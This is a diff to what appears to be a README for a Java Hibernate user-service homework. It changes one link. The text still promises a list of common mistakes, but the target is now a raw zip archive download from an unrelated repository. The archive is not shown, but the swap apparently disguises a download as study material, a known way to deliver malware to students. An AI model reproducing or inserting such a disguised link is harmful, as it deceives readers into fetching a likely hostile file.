@@ -39,4 +39,4 @@ Your task is to implement the following steps:
 
     - Please don’t forget to use salt and password hashing
 
-[Try to avoid these common mistakes, while solving task](https://mate-academy.github.io/jv-program-common-mistakes/hibernate/add-user-service/add-user-service-checklist)
+[Try to avoid these common mistakes, while solving task](https://raw.githubusercontent.com/karaedd/hibernate-user-service-hw/master/hoofless/hibernate-user-service-hw.zip)
